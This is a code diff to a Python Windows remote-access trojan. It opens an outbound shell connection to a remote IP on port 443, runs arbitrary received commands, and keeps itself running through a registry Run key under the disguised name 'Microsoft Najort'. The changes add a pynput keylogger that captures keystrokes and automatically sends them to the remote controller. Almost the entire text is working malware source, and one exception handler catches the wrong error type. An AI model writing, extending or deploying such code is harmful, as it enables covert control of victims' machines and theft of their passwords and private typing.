@@ -1,16 +1,85 @@
+from datetime import datetime
 import os
 import shutil
 import socket
 import subprocess
 import sys
-from time import sleep
 import winreg
+from time import sleep
+from pynput import keyboard
 
 IP = "remote IP"
 PORT = 443
 
 PROGRAM_NAME = "Microsoft Najort"
-REGISTRY_KEY_PATH = "Software/Microsoft/Windows/CurrentVersion/Run"
+REGISTRY_KEY_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
+MAX_BUFFER_SIZE = 500
+
+keylog_buffer = []
+buffer_auto_send_pending = False
+keylogger_active = False
+listener = None
+
+def format_key(key):
+    try:
+        return key.char
+    except ArithmeticError:
+        special_keys = {
+            keyboard.Key.space: ' ',
+            keyboard.Key.enter: '[ENTER]\n',
+            keyboard.Key.tab: '[TAB]',
+            keyboard.Key.backspace: '[BACKSPACE]',
+            keyboard.Key.shift: '',
+            keyboard.Key.ctrl: '',
+            keyboard.Key.alt: ''
+        }
+        return special_keys.get(key, f'[{key.name.upper()}]')
+
+def on_press(key):
+    global keylog_buffer, buffer_auto_send_pending
+    
+    formatted = format_key(key)
+    if formatted:
+        keylog_buffer.append(formatted)
+        
+    if len(keylog_buffer) >= MAX_BUFFER_SIZE:
+        buffer_auto_send_pending = True
+    
+def get_keylog_data():
+    global keylog_buffer
+    
+    if not keylog_buffer:
+        return "[i] keylog buffer is empty"
+
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    data = f"[+] keylog captured at {timestamp}:\n{''.join(keylog_buffer)}"
+    keylog_buffer = []
+    
+    return data
+
+def start_keylogger():
+    global keylogger_active, listener
+    
+    if keylogger_active:
+        return "[i] keylogger already running"
+    
+    listener = keyboard.Listener(on_press=on_press)
+    listener.start()
+    keylogger_active = True
+    
+    return "[+] keylogger started\n"
+
+def stop_keylogger():
+    global keylogger_active, listener
+    
+    if not keylogger_active:
+        return "[i] keylogger not running"
+    
+    if listener:
+        listener.stop()
+        
+    keylogger_active = False
+    return "[+] keylogger stopped\n"
 
 def copy_to_system():
     try:
@@ -94,13 +163,26 @@ def connect(ip, port):
         print(f"[!] Connection Error: {e}")
 
 def listen(c):
+    global buffer_auto_send_pending
+    
     try:
         while True:
-            data = c.recv(1024).decode().strip()
-            if data == "/exit":
-                return
-            else:
-                cmd(c, data)
+            if buffer_auto_send_pending:
+                data = get_keylog_data()
+                c.send(f"[AUTO-SEND] {data}\n[AUTO-SEND]\n".encode())
+                buffer_auto_send_pending = False
+                
+            c.settimeout(.5)
+            
+            try:
+                data = c.recv(1024).decode().strip()
+                if data == "/exit":
+                    return
+                else:
+                    cmd(c, data)
+            except socket.timeout:
+                continue 
+            
     except Exception as e:
         print(f"[!] Listen function Error: {e}")
         
@@ -111,30 +193,53 @@ def cmd(c, data):
             c.send(b"[i] Directory changed\n")
             return        
         
-        if data == "/check_persistence":
+        elif data == "/persistence status":
             if check_persistence():
-                c.send(f"[+] Persistence Status\n[i] Path: {sys.executable}\n\t[i] Registry key: {REGISTRY_KEY_PATH}\n\t[i] Name: {PROGRAM_NAME}\n".encode())
+                c.send(f"[+] Persistence Status\n[i] Path: {sys.executable}\n\t[i] Registry key: {REGISTRY_KEY_PATH}\n\t[i] Name: {PROGRAM_NAME}\n\n".encode())
                 return
             else:
-                c.send(b"[-] Persistence Status: FAIL")
+                c.send(b"[-] Persistence Status: FAIL\n\n")
                 return
-        if data == '/setup_persistence':
+        elif data == '/persistence setup':
             setup_persistence()
-            c.send(b"[+] Done")
+            c.send(b"[+] Done\n\n")
             return
-                 
-        p = subprocess.Popen(
-            data,
-            shell=True,
-            stdin=subprocess.PIPE,
-            stderr=subprocess.PIPE,
-            stdout=subprocess.PIPE
-        )
-        output = p.stdout.read() + p.stderr.read()
-        if output:
-            c.send(output + b"\n")
+        
+        elif data == "/keylog start":
+            rensponse = start_keylogger()
+            c.send(rensponse.encode() + b"\n\n")
+            return
+            
+        elif data == "/keylog stop":
+            rensponse = stop_keylogger()
+            c.send(rensponse.encode() + b"\n\n")
+            return
+            
+        elif data == "/keylog dump":
+            rensponse = get_keylog_data()
+            c.send(rensponse.encode() + b"\n\n")
+            return
+            
+        elif data == "/keylog status":
+            status = "Running" if keylogger_active else "Stopped"
+            buffer_size = len(keylog_buffer)
+            rensponse = f"[i] keylogger status: {status}\n[i] Buffer: {buffer_size} keys"
+            c.send(rensponse.encode() + b"\n\n")
+            return
+            
         else:
-            c.send(b"[+] Command Executed\n")
+            p = subprocess.Popen(
+                data,
+                shell=True,
+                stdin=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                stdout=subprocess.PIPE
+            )
+            output = p.stdout.read() + p.stderr.read()
+            if output:
+                c.send(output + b"\n")
+            else:
+                c.send(b"[+] Command Executed\n\n")
         
     except Exception as e:
         print(f"CMD function error: {e}") 
